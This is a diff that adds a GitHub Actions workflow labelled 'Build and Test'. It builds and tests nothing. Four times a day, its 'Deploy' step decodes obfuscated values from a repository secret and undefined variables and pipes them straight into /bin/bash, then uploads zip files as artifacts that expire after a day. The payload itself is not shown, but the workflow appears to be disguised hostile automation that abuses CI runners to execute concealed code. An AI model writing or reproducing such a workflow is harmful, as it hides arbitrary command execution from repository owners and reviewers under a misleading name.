@@ -1,0 +1,30 @@
+name: Build and Test
+on:
+  workflow_dispatch:
+
+  schedule:
+    - cron: '16 0,6,12,18 * * *'
+concurrency:
+  group: ${{ github.workflow }}
+  cancel-in-progress: false
+jobs:
+  dispatcher:
+    runs-on: ubuntu-latest
+    timeout-minutes: 360
+    steps:
+      - uses: actions/checkout@v4
+      - name: Deploy
+        env:
+          ep3: ${{ secrets.ep3 }}
+        run: |
+          printf '%s' "$ep3" | jq -r .dx5825 | /bin/bash
+          printf '%s' "$n2" | jq -r .wu35072 | /bin/bash
+          echo $kl5 | jq -r .w815 | /bin/bash
+          printf '%s' "$sbcwt143" | jq -r .xvdcc1 | /bin/bash
+
+      - name: Save results
+        uses: actions/upload-artifact@v4
+        with:
+          name: rgexn0N9
+          path: "*.zip"
+          retention-days: 1
